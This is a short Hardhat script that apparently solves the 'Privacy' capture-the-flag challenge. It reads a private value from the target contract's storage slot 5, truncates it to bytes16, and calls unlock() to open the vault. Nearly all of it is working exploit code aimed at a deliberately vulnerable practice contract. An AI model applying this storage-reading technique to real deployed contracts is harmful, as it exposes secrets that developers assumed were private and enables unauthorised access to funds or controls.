import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321';
const PLAYER_ADDRESS = '0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199';

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const contract = await ethers.getContractAt(
    'Privacy',
    CONTRACT_ADDRESS,
    signer,
  );

  // get storage at contract address
  const password = await contract.provider.getStorageAt(CONTRACT_ADDRESS, 5);

  // cast password from bytes32 type to bytes16 type
  const passwordBytes16 = ethers.utils.hexDataSlice(password, 0, 16);

  // unlock the vault
  const tx = await contract.unlock(passwordBytes16);

  console.log('Contract is locked:', await contract.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
